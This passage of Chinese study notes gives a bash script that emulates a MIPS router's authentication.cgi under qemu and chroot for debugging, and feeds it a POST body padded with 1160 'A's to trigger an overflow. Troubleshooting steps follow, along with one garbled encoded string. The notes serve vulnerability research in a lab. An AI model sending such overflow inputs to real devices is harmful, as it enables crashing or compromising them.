
```bash
#!/bin/bash
# 待执行命令
# sudo ./run_cgi.sh `python -c "print 'uid=A21G&password='+'A'*1160"` "uid=A21G"
INPUT="$1" # 参数1，uid=A21G&password=1160个A
TEST="$2" # 参数2，uid=A21G
LEN=$(echo -n "$INPUT" | wc -c) # 参数1的长度
PORT="1234" # 监听的调试端口

# 用法错误则提示
if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
then
echo -e "\nUsage: sudo $0 \n"
exit 1
fi

# 复制qemu-mipsel-static到本目录并重命名，注意是static版本
cp $(which qemu-mipsel-static) ./qemu
echo $TEST
# ｜ 管道符：前者输出作为后者输入
# chroot 将某目录设置为根目录（逻辑上的）
echo "$INPUT" | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E REQUEST_URI="/authentication.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT /htdocs/web/authentication.cgi
echo 'run ok'
rm -f ./qemu # 删除拷贝过来的执行文件
```

3. 书中原有的poc运行失败

   - 去掉`2>/dev/null`，使其显示报错信息（2-标准报错信息

   - `chroot: failed to run command ‘./qemu’: No such file or directory`

   - `60fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4S2A6k6i4q4A6j5h3&6Z5N6h3p5#2y4g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3y4e0l9%4y4o6V1@1z5o6V1`.

   - `apt` 安装 `qemu-user-static`，将 `cp` 中 `qemu-mipsel` 改为 `qemu-mipsel-static`

   - 应该是因为 `chroot` 后，路径都变了，`qemu` 的执行缺少依赖，改为静态即可

4. Ubuntu中执行脚本，开启调试端口1234，等待远程调试机连接
